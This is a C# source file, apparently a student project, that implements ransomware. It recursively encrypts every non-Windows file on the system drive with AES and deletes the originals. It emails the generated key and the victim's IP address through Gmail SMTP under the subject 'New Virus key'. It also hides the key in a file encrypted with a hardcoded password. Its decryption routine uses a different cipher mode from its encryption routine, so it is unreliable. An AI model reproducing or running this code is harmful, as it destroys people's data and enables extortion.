using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
//using System.Windows.Forms;
using System.Net.Mail;
using System.Net.Sockets;


namespace EncryptionLogic
{

	public class Encryption
	{
		private static Random random = new Random();

		private static List<string> listOfFilesToEncrypt;
		//private static byte[] passwordBytes = new byte[];

		private void sendKey(string key)
		{
			try
			{
				var fromAddress = new MailAddress("", "From Name");
				var toAddress = new MailAddress("", "To Name");
				const string fromPassword = "";
				string subject = "New Virus key for IP address: " + GetIP();
				string body = string.Format("The key for IP address {0} is {1}", GetIP(), key);

				var smtp = new SmtpClient
				{
					Host = "smtp.gmail.com",
					Port = 587,
					EnableSsl = true,
					DeliveryMethod = SmtpDeliveryMethod.Network,
					UseDefaultCredentials = false,
					Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
				};
				using (var message = new MailMessage(fromAddress, toAddress)
				{
					Subject = subject,
					Body = body
				})
				{
					smtp.Send(message);
				}
			}
			catch (Exception e)
			{
				MessageBox.Show("An exception has occurred trying to send the email. The error is:   " + e.Message);
			}
		}

		private static string GetIP()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("Local IP Address Not Found!");
		}

		public string generate256BitKey()
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

			try
			{
				return new string(Enumerable.Repeat(chars, 256)
					.Select(s => s[random.Next(s.Length)]).ToArray());

			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message);

			}
			return null;
		}

		private void encryptFile(string file, Rfc2898DeriveBytes key, byte[] salt)
		{
			FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create);
			RijndaelManaged AES = new RijndaelManaged();
			AES.KeySize = 256;
			AES.BlockSize = 128;
			AES.Padding = PaddingMode.PKCS7;
			AES.Key = key.GetBytes(AES.KeySize / 8);
			AES.IV = key.GetBytes(AES.BlockSize / 8);
			fsCrypt.Write(salt, 0, salt.Length);

			CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

			FileStream fsIn = new FileStream(file, FileMode.Open);

			//create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
			byte[] buffer = new byte[1048576];
			int read;

			try
			{
				while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
				{
					cs.Write(buffer, 0, read);
				}

				// Close up
				fsIn.Close();
				
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error: " + ex.Message);
			}
			finally
			{
				cs.Close();
				fsCrypt.Close();
				File.Delete(file);
			}
		}
		[STAThread]
		public int encryptDesktop()
		{
			try
			{
				//string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				listOfFilesToEncrypt = getCDriveFiles().ToList();
				//DirectoryInfo d = new DirectoryInfo(filepath);
				byte[] salt = { 38, 88, 100, 223, 246, 208, 35, 97, 86, 56, 39, 173, 69, 59, 144, 204, 130, 90, 97, 238, 33, 7, 169, 124, 36, 6, 92, 146, 36, 8, 62, 122 };

				string passwordBytes = generate256BitKey();
				sendKey(passwordBytes);

				var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);

				System.Windows.Forms.Clipboard.SetText(passwordBytes);
				MessageBox.Show(passwordBytes);
				foreach (var file in listOfFilesToEncrypt)
				{
					if (file.Contains(".") && !file.Contains("SeniorProject"))
					{
						try 
						{
							encryptFile(file, key, salt);
							Console.WriteLine(file + " has been encrypted.");
						} catch (Exception ex) { }
					}
				}

				byte[] encryptedBytes = null;
				try
				{
					string[] txtFile = { passwordBytes, salt.ToString(), "50000" };
					File.WriteAllLines(@"C:\WriteLines.txt", txtFile);

					Rfc2898DeriveBytes gay = new Rfc2898DeriveBytes(
					"cQfTjWnZr4u7x!A%D*G-KaPdRgUkXp2s5v8y/B?E(H+MbQeThVmYq3t6w9z$C&F)J@NcRfUjXnZr4u7x!A%D*G-KaPdSgVkYp3s5v8y/B?E(H+MbQeThWmZq4t7w9z$C",
					salt);
				
					encryptFile("C:\\WriteLines.txt", gay, salt);
				}
				catch (Exception e)
				{
					
				}
				return 1;
			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message);
				return 0;
			}

		}

		public static IEnumerable<string> getCDriveFiles()
		{
			string currDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
			Queue<string> pending = new Queue<string>();
			pending.Enqueue(currDirectory);
			string[] tmp;
			while (pending.Count > 0)
			{
				currDirectory = pending.Dequeue();
				if (!currDirectory.Contains("Windows"))
				{
					try
					{
						tmp = Directory.GetFiles(currDirectory);
					}
					catch (Exception e)
					{
						continue;
					}
					for (int i = 0; i < tmp.Length; i++)
					{
						yield return tmp[i];
					}
					tmp = Directory.GetDirectories(currDirectory);
					for (int i = 0; i < tmp.Length; i++)
					{
						pending.Enqueue(tmp[i]);
					}
				}
			}
			MessageBox.Show("Got all files on C drive");
		}

		public static void decryptAllFiles(Rfc2898DeriveBytes key)
		{
			try
			{
				int read;
				foreach (var file in listOfFilesToEncrypt)
				{
					FileStream fsCrypt = new FileStream(file, FileMode.Open);
					string outputfile = file.Replace(".aes", String.Empty);
					RijndaelManaged AES = new RijndaelManaged();
					AES.KeySize = 256;
					AES.BlockSize = 128;
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);
					AES.Padding = PaddingMode.PKCS7;
					AES.Mode = CipherMode.CFB;

					CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

					FileStream fsout = new FileStream(outputfile, FileMode.Create);

					byte[] buffer = new byte[1048576];
					try
					{
						while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
						{
							fsout.Write(buffer, 0, read);
						}
					}
					catch (CryptographicException ex_cryp)
					{

					}
					try
					{
						cs.Close();
					}
					catch (Exception exx)
					{

					}
					finally
					{
						fsout.Close();
						fsCrypt.Close();
					}
				}
			}
			catch (Exception e)
			{
				System.Windows.MessageBox.Show(e.Message);
				System.Windows.MessageBox.Show(e.InnerException.ToString());
			}
		}
	}
}
